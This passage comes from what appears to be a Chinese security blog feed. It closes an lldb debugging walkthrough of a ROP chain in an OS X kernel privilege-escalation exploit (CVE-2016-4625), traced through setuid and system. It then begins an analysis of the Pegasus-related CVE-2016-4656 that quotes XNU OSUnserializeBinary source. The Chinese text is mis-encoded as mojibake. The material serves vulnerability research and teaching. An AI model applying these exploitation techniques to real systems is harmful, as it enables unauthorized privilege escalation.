<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8 -format x -count 100  0x00007fff523dea18&#10;0x7fff523dea18: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea28: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea38: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea48: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea58: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea68: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea78: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea88: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea98: 0x00007fff8fe520d5 0x00007fff8fe520d5</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­æ‰§è¡Œä»£ç </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fe8a213 libsystem_c.dylib`addr2ascii + 116, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fe8a213 libsystem_c.dylib`addr2ascii + 116&#10;libsystem_c.dylib`addr2ascii:&#10;-&#62;  0x7fff8fe8a213 &#60;+116&#62;: pop    rdi&#10;    0x7fff8fe8a214 &#60;+117&#62;: ret&#10;    0x7fff8fe8a215 &#60;+118&#62;: add    al, 0x0&#10;    0x7fff8fe8a217 &#60;+120&#62;: mov    rax, rbx</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œäº†æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ª<code>ROP</code>çš„ <code>gad_get</code>ã€‚è¿™ä¸ªæ—¶å€™å†è§‚å¯Ÿæˆ‘ä»¬çš„å‡½æ•°æ ˆ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8 -format x -count 30  $rsp-0x20&#10;0x7fff523def50: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523def60: 0x00007fff8fe520d5 0x00007fff8fe8a213&#10;0x7fff523def70: 0x0000000000000000 0x00007fff8a183628&#10;0x7fff523def80: 0x00007fff8fe8a213 0x00007fff8fedb69e&#10;0x7fff523def90: 0x00007fff8fed0e0b 0x0000000000000000&#10;0x7fff523defa0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defb0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defc0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defd0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defe0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523deff0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df000: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df010: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df020: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df030: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>å°±æ˜¯æˆ‘ä»¬æ„é€ çš„æ ˆã€‚</p>
<p>ç»§ç»­æ‰§è¡Œï¼Œä¹Ÿç¡®å®ä¼šçœ‹åˆ°ç›¸åº”çš„å‡½æ•°è¢«æ‰§è¡Œã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8a183628 libsystem_kernel.dylib`setuid, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8a183628 libsystem_kernel.dylib`setuid&#10;libsystem_kernel.dylib`setuid:&#10;-&#62;  0x7fff8a183628 &#60;+0&#62;:  mov    eax, 0x2000017&#10;    0x7fff8a18362d &#60;+5&#62;:  mov    r10, rcx&#10;    0x7fff8a183630 &#60;+8&#62;:  syscall&#10;    0x7fff8a183632 &#60;+10&#62;: jae    0x7fff8a18363c            ; &#60;+20&#62;&#10;   ...&#30465;&#30053;n&#27493;...&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed0e0b libsystem_c.dylib`system, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed0e0b libsystem_c.dylib`system&#10;libsystem_c.dylib`system:</span><br></pre></td></tr></table></figure>
<p>åˆ°æ­¤ï¼Œ<code>exploit</code>æœ€åŸºæœ¬çš„é€»è¾‘ç®—æ˜¯ç†æ¸…æ¥šäº†ã€‚</p>
<h1 id="0x04_å…³äºé˜»å¡å­è¿›ç¨‹">0x04 å…³äºé˜»å¡å­è¿›ç¨‹</h1><p>â€‹    é˜»å¡å­è¿›ç¨‹çš„æŠ€å·§æ‰€è¦è¾¾åˆ°çš„ç›®çš„å°±æ˜¯ï¼Œè®©å­è¿›ç¨‹è°ƒç”¨<code>execve</code>å‡½æ•°ä¹‹åï¼Œå†…æ ¸ä¸­æ‰§è¡Œå®Œ<code>task_t</code>ç›¸å…³æ•°æ®ä¿®æ”¹åå› ä¸º<code>Pipe</code>é˜»å¡çš„å¹¶ä¸”å·²ç»æ»¡äº†ï¼Œæ‰€ä»¥ä¸ä¼šç«‹å³å¼€å§‹æ‰§è¡Œ<code>traceroute6</code>çš„<code>main</code>å‡½æ•°ã€‚è¿™æ ·å°±ç»™çˆ¶è¿›ç¨‹åšå†…å­˜æ”¹å†™çš„æ—¶é—´çª—å£ã€‚</p>
<h1 id="0x05_å°ç»“">0x05 å°ç»“</h1><p>â€‹    åˆ†æåˆ°è¿™é‡Œï¼Œåªæ˜¯åˆæ­¥äº†è§£äº†<code>exploit</code>çš„åŸç†ï¼Œå¯¹æ•´ä¸ªæ¼æ´çš„åˆ†ææ‰åˆšåˆšå¼€å§‹ï¼Œæœ‰æ›´å¤šå€¼å¾—æŒ–æ˜å’Œæ€è€ƒçš„åœ°æ–¹ã€‚è¿™ç¯‡æ–‡ç« ä»…ä»…å¸Œæœ›èƒ½å¤Ÿå¸®åŠ©å¤§å®¶è§£å†³ç ”ç©¶<code>OS X</code>å†…æ ¸æ¼æ´çš„ä¸€äº›æœ€åŸºç¡€çš„é—®é¢˜å’Œå°æŠ€å·§ã€‚å¦‚æœæœ‰ä¸è¶³ä¹‹å¤„è¿˜å¸Œæœ›å¤§å®¶æŒ‡å‡ºï¼šï¼‰</p>
<h1 id="reference">reference</h1><p>1.<a href="http://lldb.llvm.org/lldb-gdb.html" target="_blank" rel="external">The LLDB Debugger</a></p>
<p>2.<a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a></p>
<p>3.<a href="http://kb.parallels.com/cn/116526" target="_blank" rel="external">How to boot into OS X Recovery Mode on Parallels Desktop</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    å‰ä¸¤å¤©<a href="https://googleprojectzero.blogspot.com/">Project Zero</a>çš„blogä¸Šé¢ï¼ŒIan Beerå‘è¡¨äº†ä¸€ç¯‡æ–°çš„æ–‡ç« ï¼Œè®¨è®ºäº†åœ¨<code>xnu</code> çš„å†…æ ¸åœ¨è®¾è®¡ä¸Šå­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜ï¼Œä»è€Œå¯ä»¥å¯¼è‡´ææƒï¼Œæ²™ç®±é€ƒé€¸ç­‰ä¸€æ´—äº†çš„é—®é¢˜ã€‚å¹¶ä¸”æä¾›äº†ç›¸åº”çš„çš„POCä¸EXPæºç ã€‚è¿™ç¯‡æ–‡ç« æ˜¯è°ƒè¯•ä¸åˆ†æå…¶ä¸­ç¬¬ä¸€ä¸ªæ¼æ´<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4625">CVE-2016-4625</a>çš„éƒ¨åˆ†ã€‚</p>
<p><a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html">task_t considered harmful</a></p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=831&amp;can=1&amp;q=apple&amp;sort=-id">OS X/iOS kernel use-after-free in IOSurface</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="POC" scheme="http://turingh.github.io/tags/POC/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4656åˆ†æä¸è°ƒè¯•]]></title>
    <link href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>http://turingh.github.io/2016/09/07/CVE-2016-4656åˆ†æä¸è°ƒè¯•/</id>
    <published>2016-09-07T20:48:47.000Z</published>
    <updated>2016-09-07T22:20:09.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p> <a href="http://blog.pangu.io/pegasus-apt/" target="_blank" rel="external">Pegasus â€“ é’ˆå¯¹iOSè®¾å¤‡çš„APTæ”»å‡»åˆ†æ- PanguTeam</a></p>
<p> <a href="http://www.freebuf.com/articles/terminal/113128.html" target="_blank" rel="external">iOSâ€œè¿œç¨‹è¶Šç‹±â€é—´è°è½¯ä»¶PegasusæŠ€æœ¯åˆ†æ</a></p>
<p>å…³å¿ƒ<code>IOS</code>å®‰å…¨çš„æŠ€æœ¯äººå‘˜æœ€è¿‘ä¸€å®šéƒ½å…³æ³¨äº†è¿™ä¸€æ¬¡çš„å®‰å…¨äº‹ä»¶ï¼Œä¸éœ€è¦å¤šåšæè¿°äº†ï¼Œæƒ³äº†è§£å…·ä½“ç»†èŠ‚çš„å¯ä»¥è‡ªè¡Œ<code>google</code>ã€‚</p>
<p>æœ¬æ–‡å†…å®¹</p>
<ul>
<li>äº†æ¼æ´æ‰€åœ¨çš„å‡½æ•°<code>OSUnserializeBinary</code>ï¼Œäº†è§£å…¶äºŒè¿›åˆ¶æ ¼å¼</li>
<li>ç†è§£<code>POC</code>ï¼Œåˆ†æ<code>POC</code>æ‰§è¡Œçš„æµç¨‹</li>
</ul>
<p>å…·ä½“çš„æŠ€æœ¯èƒŒæ™¯ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« </p>
<p><a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html" target="_blank" rel="external">PEGASUS iOS Kernel Vulnerability Explained</a></p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html" target="_blank" rel="external">PEGASUS iOS Kernel Vulnerability Explained - Part 2</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2996.html" target="_blank" rel="external">iOSä¸‰å‰æˆŸæ¼æ´è¡¥ä¸åˆ†æã€åˆ©ç”¨ä»£ç  å…¬å¸ƒï¼ˆPOCï¼‰</a></p>
<a id="more"></a>
<h1 id="0x01_OSUnserializeBinary">0x01 OSUnserializeBinary</h1><p>åœ¨è½¯ä»¶å¼€å‘çš„æµç¨‹ä¸­ï¼Œåœ¨ä¸¤ä¸ªæ¨¡å—è¿›è¡Œé€šä¿¡æ—¶ï¼Œéƒ½ä¼šé‡åˆ°ä½¿ç”¨<code>åºåˆ—åŒ–</code>å’Œ<code>ååºåˆ—åŒ–</code>ä¼ é€’ä¸€äº›æ•°æ®ç»“æ„ï¼Œæˆ–è€…å†…éƒ¨æ•°æ®ï¼Œæ¯”è¾ƒå…¸å‹çš„å°±æ˜¯<code>google</code>çš„<code>protobuf</code>ã€‚</p>
<p>åœ¨<code>XNU</code>å†…æ ¸ä¹‹ä¸­ï¼Œè‡ªå·±å®ç°äº†ä¸€å¥—<code>C++</code>çš„å­é›†ï¼Œä¸º<code>IOKIT</code>çš„å¼€å‘æä¾›æ”¯æŒï¼Œå…¶ä¸­å°±æä¾›äº†ä¸€å¥—è‡ªå·±çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„é€»è¾‘ã€‚</p>
<p>è¿™æ¬¡å‡ºç°é—®é¢˜çš„<code>OSUnserializeBinary</code>ä¾¿æ˜¯è¿™ä¸€ä¸ªæ¨¡å—ä¸­çš„ä¸€ä¸ªå‡½æ•°ã€‚</p>
<h2 id="1-1_OSUnserializeBinary">1.1 OSUnserializeBinary</h2><p>ä¸‹é¢æ˜¯å¯¹æºç çš„ç®€å•åˆ†æã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">OSObject *</span><br><span class="line">OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)</span><br><span class="line">&#123;</span><br><span class="line">	/*</span><br><span class="line">		...åˆå§‹åŒ–å˜é‡</span><br><span class="line">	*/</span><br><span class="line">	if (errorString) *errorString = 0;</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	#define kOSSerializeBinarySignature "\323\0\0"</span><br><span class="line">	*/</span><br><span class="line">  </span><br><span class="line">  	// ç­‰å¾…ååºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ•°æ®å­˜åœ¨ä¸€å®šçš„æ ¼å¼</span><br><span class="line">  </span><br><span class="line">	// æ£€æµ‹æ˜¯å¦æ˜¯æ˜¯å…·æœ‰ç­¾åçš„å†…å­˜æ•°æ®</span><br><span class="line">	if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);</span><br><span class="line">	</span><br><span class="line">	if (3 &amp; ((uintptr_t) buffer)) return (NULL);</span><br><span class="line">	// æ£€æµ‹buffersizeçš„å¤§å°è¦å°äºkOSSerializeBinarySignatureçš„å¤§å°</span><br><span class="line">	if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);</span><br><span class="line">	// è·³è¿‡å†…å­˜å¼€å§‹çš„ç­¾åéƒ¨åˆ†ï¼Œè·å–ç¬¬ä¸€ä¸ªéœ€è¦è§£æçš„å†…å­˜</span><br><span class="line">	bufferPos = sizeof(kOSSerializeBinarySignature);</span><br><span class="line">	next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);</span><br><span class="line"></span><br><span class="line">	DEBG("---------OSUnserializeBinary(%p)\n", buffer);</span><br><span class="line"></span><br><span class="line">  	// ååºåˆ—åŒ–æµç¨‹ä¸­ä¼šä½¿ç”¨åˆ°çš„ä¸€äº›çŠ¶æ€å˜é‡</span><br><span class="line">	objsArray = stackArray    = NULL;</span><br><span class="line">	objsIdx   = objsCapacity  = 0;</span><br><span class="line">	stackIdx  = stackCapacity = 0;</span><br><span class="line"></span><br><span class="line">    result   = 0;</span><br><span class="line">    parent   = 0;</span><br><span class="line">	dict     = 0;</span><br><span class="line">	array    = 0;</span><br><span class="line">	set      = 0;</span><br><span class="line">	sym      = 0;</span><br><span class="line"></span><br><span class="line">	ok = true;</span><br><span class="line">	while (ok)</span><br><span class="line">	&#123;</span><br><span class="line">		// é€šè¿‡nextæŒ‡å‘çš„å†…å®¹è·å–å½“å‰çš„keyçš„pos</span><br><span class="line">		bufferPos += sizeof(*next);</span><br><span class="line">		// æ£€æµ‹æ˜¯å¦åˆ†æå®Œæˆ</span><br><span class="line">		if (!(ok = (bufferPos &lt;= bufferSize))) break;</span><br><span class="line">		// è·å–å½“å‰çš„k</span><br><span class="line">		key = *next++;</span><br><span class="line"></span><br><span class="line">        len = (key &amp; kOSSerializeDataMask);</span><br><span class="line">        wordLen = (len + 3) &gt;&gt; 2; //è®¡ç®—è¦ç”¨å‡ ä¸ªword</span><br><span class="line">		end = (0 != (kOSSerializeEndCollecton &amp; key));</span><br><span class="line">        DEBG("key 0x%08x: 0x%04x, %d\n", key, len, end);</span><br><span class="line"></span><br><span class="line">        newCollect = isRef = false;</span><br><span class="line">		o = 0; newDict = 0; newArray = 0; newSet = 0;</span><br><span class="line">		</span><br><span class="line">		//æ ¹æ®keyçš„ä¸åŒå¯¹ä¸åŒçš„æ•°æ®ç»“æ„åšæ“ä½œ</span><br><span class="line">		switch (kOSSerializeTypeMask &amp; key)</span><br><span class="line">		&#123;</span><br><span class="line">		    case kOSSerializeDictionary:</span><br><span class="line">				o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeArray:</span><br><span class="line">				o = newArray = OSArray::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		  	/*</span><br><span class="line">		  		...</span><br><span class="line">		  	*/</span><br><span class="line">		    default:</span><br><span class="line">		        break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//é€€å‡ºå¾ªç¯</span><br><span class="line">		if (!(ok = (o != 0))) break;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		//å¦‚æœååºåˆ—åŒ–çš„ç»“æœä¸æ˜¯ä¸€ä¸ªreference</span><br><span class="line">		//å°±å°†ç»“æœå­˜æ”¾åˆ°objsArrayä¹‹ä¸­</span><br><span class="line">		if (!isRef)</span><br><span class="line">		&#123;</span><br><span class="line">			setAtIndex(objs, objsIdx, o);</span><br><span class="line">			//å¦‚æœokçš„å€¼ä¸ºfalseï¼Œåˆ™é€€å‡ºååºåˆ—åŒ–å¾ªç¯</span><br><span class="line">			</span><br><span class="line">			//	#define kalloc_container(size)	</span><br><span class="line">			//		kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">			/*</span><br><span class="line">				typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">				if (!nbuf) ok = false;</span><br><span class="line">			*/</span><br><span class="line">			</span><br><span class="line">			//åœ¨å†…æ ¸ä¸­ç”³è¯·ncap*sizeofï¼ˆoï¼‰å¤§å°çš„å†…å­˜ï¼Œå¦‚æœç”³è¯·å¤±è´¥çš„äº†åˆ™okè®¾ä¸ºfalse</span><br><span class="line">			if (!ok) &#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			objsIdx++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//å¯¹è§£æå‡ºæ¥çš„oè¿›è¡Œä¸åŒçš„æ“ä½œ</span><br><span class="line">		if (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			/*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else if (array) </span><br><span class="line">		&#123;</span><br><span class="line">			/*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else if (set)</span><br><span class="line">		&#123;</span><br><span class="line">		   /*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">		    /*...*/</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (!ok) break;</span><br><span class="line"></span><br><span class="line">      	//è§£æçš„æµç¨‹ä¸­å‡ºç°äº†ä¸€äº›æ–°çš„å®¹å™¨</span><br><span class="line">		if (newCollect)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!end)</span><br><span class="line">			&#123;</span><br><span class="line">				stackIdx++;</span><br><span class="line">				setAtIndex(stack, stackIdx, parent);</span><br><span class="line">				if (!ok) break;</span><br><span class="line">			&#125;</span><br><span class="line">			DEBG("++stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			parent = o;</span><br><span class="line">			dict   = newDict;</span><br><span class="line">			array  = newArray;</span><br><span class="line">			set    = newSet;</span><br><span class="line">			end    = false;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">      	//è§£æç»“æŸ</span><br><span class="line">		if (end)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!stackIdx) break;</span><br><span class="line">			parent = stackArray[stackIdx];</span><br><span class="line">			DEBG("--stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			stackIdx--;</span><br><span class="line">			set   = 0; </span><br><span class="line">			dict  = 0; </span><br><span class="line">			array = 0;</span><br><span class="line">			if (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">			&#123;</span><br><span class="line">				if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG("ret %p\n", result);</span><br><span class="line"></span><br><span class="line">	if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));</span><br><span class="line">	if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));</span><br><span class="line"></span><br><span class="line">	if (!ok &amp;&amp; result)</span><br><span class="line">	&#123;</span><br><span class="line">		result-&gt;release();</span><br><span class="line">		result = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	return (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_setAtIndex">1.2 setAtIndex</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> setAtIndex(v, idx, o)													\</span><br><span class="line">	<span class="keyword">if</span> (idx &gt;= v##Capacity)														\</span><br><span class="line">	&#123;																			\</span><br><span class="line">		uint32_t ncap = v##Capacity + <span class="number">64</span>;										\</span><br><span class="line">		typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));	\</span><br><span class="line">		<span class="keyword">if</span> (!nbuf) ok = false;													\</span><br><span class="line">		<span class="keyword">if</span> (v##Array)															\</span><br><span class="line">		&#123;																		\</span><br><span class="line">			bcopy(v##Array, nbuf, v##Capacity * sizeof(o));						\</span><br><span class="line">			kfree(v##Array, v##Capacity * sizeof(o));							\</span><br><span class="line">		&#125;																		\</span><br><span class="line">		v##Array    = nbuf;														\</span><br><span class="line">		v##Capacity = ncap;														\</span><br><span class="line">	&#125;																			\</span><br><span class="line">	<span class="keyword">if</span> (ok) v##Array[idx] = o;</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€æ®µå®ç”¨åœ¨ä»£ç ä¸­å¤§æ„å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (idx&gt;v<span class="preprocessor">##capacity)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* æ‰©å……æ•°ç»„*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ok) </span><br><span class="line">&#123;</span><br><span class="line">  v<span class="preprocessor">##Array[idx]=o</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤§æ„å°±æ˜¯è®²æ•°æ®<code>o</code>æ”¾ç½®åˆ°æ•°ç»„ä¸­çš„<code>idx</code>å¤„ï¼Œå¦‚æœæ•°ç»„ä¸å¤Ÿå¤§äº†å°±æ‰©å……ä¸€ä¸‹æ•°ç»„çš„å¤§å°ã€‚</p>
<h2 id="1-3_æºç åˆ†æ">1.3 æºç åˆ†æ</h2><p>â€‹    è¯¥å‡½æ•°çš„å¤§è‡´æµç¨‹ä¸æˆ‘ä»¬é€šå¸¸é‡åˆ°çš„ååºåˆ—åŒ–å‡½æ•°å½¢å¼åŸºæœ¬ç›¸åŒï¼Œåˆ†ä¸ºä»¥ä¸‹å‡ æ­¥</p>
<ul>
<li>æ£€æµ‹äºŒè¿›åˆ¶æ–‡ä»¶æ ¼å¼ï¼Œæ˜¯å¦ç¬¦åˆè¦æ±‚</li>
<li>ä¾æ¬¡è¯»å–äºŒè¿›åˆ¶æ•°æ®ï¼Œè¿›è¡Œåˆ†æï¼Œå¹¶ä¸”å°†è§£æçš„ç»“æœå­˜æ”¾åˆ°å¯¹åº”çš„æ•°æ®ç»“æ„ä¹‹ä¸­</li>
</ul>
<h3 id="1-3-1_äºŒè¿›åˆ¶æ–‡ä»¶æ ¼å¼">1.3.1 äºŒè¿›åˆ¶æ–‡ä»¶æ ¼å¼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ£€æµ‹æ˜¯å¦æ˜¯æ˜¯å…·æœ‰ç­¾åçš„å†…å­˜æ•°æ®</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">strcmp</span>(kOSSerializeBinarySignature, buffer)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">3</span> &amp; ((<span class="keyword">uintptr_t</span>) buffer)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// æ£€æµ‹buffersizeçš„å¤§å°è¦å°äºkOSSerializeBinarySignatureçš„å¤§å°</span></span><br><span class="line"><span class="keyword">if</span> (bufferSize &lt; <span class="keyword">sizeof</span>(kOSSerializeBinarySignature)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
